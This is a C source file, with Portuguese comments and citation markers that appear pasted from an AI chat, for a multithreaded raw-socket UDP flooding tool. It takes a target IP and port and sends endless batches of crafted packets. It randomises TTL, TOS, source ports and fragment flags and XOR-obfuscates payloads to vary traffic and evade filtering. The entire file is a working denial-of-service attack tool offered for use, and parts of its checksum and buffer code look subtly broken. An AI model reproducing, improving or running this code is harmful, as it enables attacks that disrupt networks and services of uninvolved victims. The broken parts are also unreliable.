#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <x86intrin.h>
#include <sched.h>
#include <netinet/in.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <net/if.h>
#include <time.h>

#define MIN_PAYLOAD 16
#define MAX_PAYLOAD 64
#define MAX_PACKET_SIZE (sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD)
#define BATCH_SIZE 1024
#define CPU_CORES 4

struct thread_args {
    int sockfd;
    char *src_ip;
    struct sockaddr_in dest_addr;
};

void set_cpu_affinity(int cpu) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
}

unsigned short ip_checksum(void *addr, size_t count) {
    register unsigned long sum = 0;
    unsigned short *ptr = addr;

    while (count > 1) {
        sum += *ptr++;
        count -= 2;
    }
    if (count > 0)
        sum += *(unsigned char *)ptr;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return (unsigned short)(~sum);
}

uint16_t udp_checksum(struct iphdr *ip, struct udphdr *udp, uint16_t payload_len) {
    uint32_t sum = 0;
    uint16_t udp_len = sizeof(struct udphdr) + payload_len;
    
    // Pseudo-header (RFC 768) [[1]][[4]]
    sum += ntohs((ip->saddr >> 16) & 0xFFFF); // Source IP (16 bits MSB)
    sum += ntohs((ip->saddr) & 0xFFFF);       // Source IP (16 bits LSB)
    sum += ntohs((ip->daddr >> 16) & 0xFFFF); // Dest IP (16 bits MSB)
    sum += ntohs((ip->daddr) & 0xFFFF);       // Dest IP (16 bits LSB)
    sum += htons(IPPROTO_UDP);                // Protocolo UDP (17)
    sum += htons(udp_len);                    // Comprimento UDP (network order)

    // Cabeçalho UDP [[3]]
    sum += ntohs(udp->source); // Porta origem (host order)
    sum += ntohs(udp->dest);   // Porta destino (host order)
    sum += udp_len;            // Comprimento em host order

    // Payload [[5]]
    uint16_t *payload = (uint16_t *)((uint8_t *)udp + sizeof(struct udphdr));
    for (int i = 0; i < payload_len/2; i++) {
        sum += ntohs(payload[i]); // Conversão para host order
    }
    if (payload_len % 2) {
        sum += ((uint8_t *)payload)[payload_len-1] << 8;
    }

    // Redução de carry [[2]]
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return htons((uint16_t)(~sum)); // Retorna network order
}

int is_valid_ip(struct sockaddr_in *addr) {
    uint32_t ip = ntohl(addr->sin_addr.s_addr);
    if ((ip & 0xFF000000) == 0x7F000000) return 0;
    if ((ip & 0xFF000000) == 0x0A000000) return 0;
    if ((ip & 0xFFF00000) == 0xAC100000) return 0;
    if ((ip & 0xFFFF0000) == 0xC0A80000) return 0;
    return 1;
}

char **get_external_ips(int *count) {
    struct ifaddrs *ifaddr, *ifa;
    char **ips = NULL;
    *count = 0;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) continue;
        if (ifa->ifa_addr->sa_family != AF_INET) continue;
        if (!(ifa->ifa_flags & IFF_UP)) continue;
        if (ifa->ifa_flags & IFF_LOOPBACK) continue;

        struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
        if (is_valid_ip(addr)) (*count)++;
    }

    ips = calloc(*count, sizeof(char *));
    if (!ips) exit(EXIT_FAILURE);

    int i = 0;
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) continue;
        if (ifa->ifa_addr->sa_family != AF_INET) continue;
        if (!(ifa->ifa_flags & IFF_UP)) continue;
        if (ifa->ifa_flags & IFF_LOOPBACK) continue;

        struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
        if (is_valid_ip(addr)) {
            ips[i] = calloc(INET_ADDRSTRLEN, 1);
            inet_ntop(AF_INET, &addr->sin_addr, ips[i], INET_ADDRSTRLEN);
            i++;
        }
    }

    freeifaddrs(ifaddr);
    return ips;
}

int setup_socket(char *src_ip) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    int val = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &val, sizeof(val));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, src_ip, &addr.sin_addr);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    int bufsize = 512 * 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    int busy_poll = 2;
    setsockopt(sockfd, SOL_SOCKET, SO_BUSY_POLL, &busy_poll, sizeof(busy_poll));

    int nofragment = IP_PMTUDISC_DONT;
    setsockopt(sockfd, IPPROTO_IP, IP_MTU_DISCOVER, &nofragment, sizeof(nofragment));

    return sockfd;
}

void *send_packets(void *args) {
    struct thread_args *targs = args;
    set_cpu_affinity(pthread_self() % CPU_CORES);

    struct mmsghdr *msgs;
    struct iovec *iovecs;
    char (*buffers)[MAX_PACKET_SIZE];
    
    posix_memalign((void **)&msgs, 4096, BATCH_SIZE * sizeof(struct mmsghdr));
    posix_memalign((void **)&iovecs, 4096, BATCH_SIZE * sizeof(struct iovec));
    posix_memalign((void **)&buffers, 4096, BATCH_SIZE * MAX_PACKET_SIZE);

    struct sockaddr_in dest = targs->dest_addr;
    dest.sin_family = AF_INET;

    char full_packet[MAX_PACKET_SIZE] __attribute__((aligned(64)));
    struct iphdr *ip = (struct iphdr *)full_packet;
    struct udphdr *udp = (struct udphdr *)(full_packet + sizeof(struct iphdr));

    uint8_t xor_key = 0xAA;
    uint8_t ttl_values[] = {64, 128, 255};
    uint16_t ip_id = 0xFFFF;

    while (1) {
        uint16_t payload_size = MIN_PAYLOAD + (rand() % (MAX_PAYLOAD - MIN_PAYLOAD + 1));
        uint16_t total_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;

        ip->version = 4;
        ip->ihl = 5;
        ip->tot_len = htons(total_size);
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targs->src_ip);
        ip->daddr = dest.sin_addr.s_addr;
        
        udp->dest = dest.sin_port;
        udp->source = htons(1024 + (rand() % (65535 - 1024 + 1)));
        udp->len = htons(sizeof(struct udphdr) + payload_size);

        // Ofuscação após preparação do cabeçalho [[5]]
        for (int i = 0; i < payload_size; i++) {
            full_packet[sizeof(struct iphdr) + sizeof(struct udphdr) + i] ^= xor_key;
        }

        // Atualizações finais
        ip->ttl = ttl_values[rand() % 3];
        ip->id = htons(ip_id++);
        ip->tos = rand() % 256;
        ip->frag_off = (rand() % 2) ? htons(1 << 13) : 0;

        // Checksums após todas as modificações [[1]][[3]]
        ip->check = 0;
        ip->check = ip_checksum(ip, sizeof(struct iphdr));
        udp->check = 0;
        udp->check = udp_checksum(ip, udp, payload_size);

        __m512i packet_template = _mm512_loadu_si512(full_packet);

        for (int i = 0; i < BATCH_SIZE; i += 8) {
            _mm512_storeu_si512((__m512i *)(buffers[i]), packet_template);
            _mm512_storeu_si512((__m512i *)(buffers[i+1]), packet_template);
            _mm512_storeu_si512((__m512i *)(buffers[i+2]), packet_template);
            _mm512_storeu_si512((__m512i *)(buffers[i+3]), packet_template);
            _mm512_storeu_si512((__m512i *)(buffers[i+4]), packet_template);
            _mm512_storeu_si512((__m512i *)(buffers[i+5]), packet_template);
            _mm512_storeu_si512((__m512i *)(buffers[i+6]), packet_template);
            _mm512_storeu_si512((__m512i *)(buffers[i+7]), packet_template);
        }

        for (int i = 0; i < BATCH_SIZE; i++) {
            iovecs[i].iov_base = buffers[i];
            iovecs[i].iov_len = total_size;
            msgs[i].msg_hdr.msg_name = &dest;
            msgs[i].msg_hdr.msg_namelen = sizeof(dest);
            msgs[i].msg_hdr.msg_iov = &iovecs[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
        }

        int sent = sendmmsg(targs->sockfd, msgs, BATCH_SIZE, MSG_MORE | MSG_NOSIGNAL);
        if (sent < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                nanosleep((const struct timespec[]){{0, 100}}, NULL);
                continue;
            }
            perror("sendmmsg");
            usleep(50);
        }

        struct timespec ts = {0, (rand() % 1000) * 1000};
        nanosleep(&ts, NULL);
    }

    free(msgs);
    free(iovecs);
    free(buffers);
    close(targs->sockfd);
    return NULL;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Uso: %s <dest_ip> <dest_port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &dest_addr.sin_addr);

    int ip_count;
    char **src_ips = get_external_ips(&ip_count);
    
    if (ip_count == 0) {
        fprintf(stderr, "Nenhum IP externo válido encontrado!\n");
        exit(EXIT_FAILURE);
    }

    int num_threads = ip_count < CPU_CORES ? ip_count : CPU_CORES;
    
    pthread_t threads[num_threads];
    struct thread_args targs[num_threads];

    pthread_attr_t attr;
    cpu_set_t cpuset;
    pthread_attr_init(&attr);
    
    for (int i = 0; i < num_threads; i++) {
        CPU_ZERO(&cpuset);
        CPU_SET(i % CPU_CORES, &cpuset);
        pthread_attr_setaffinity_np(&attr, sizeof(cpu_set_t), &cpuset);
        
        targs[i].sockfd = setup_socket(src_ips[i % ip_count]);
        targs[i].src_ip = src_ips[i % ip_count];
        targs[i].dest_addr = dest_addr;
        
        pthread_create(&threads[i], &attr, send_packets, &targs[i]);
    }

    pthread_attr_destroy(&attr);
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    for (int i = 0; i < ip_count; i++) {
        free(src_ips[i]);
    }
    free(src_ips);

    return 0;
}
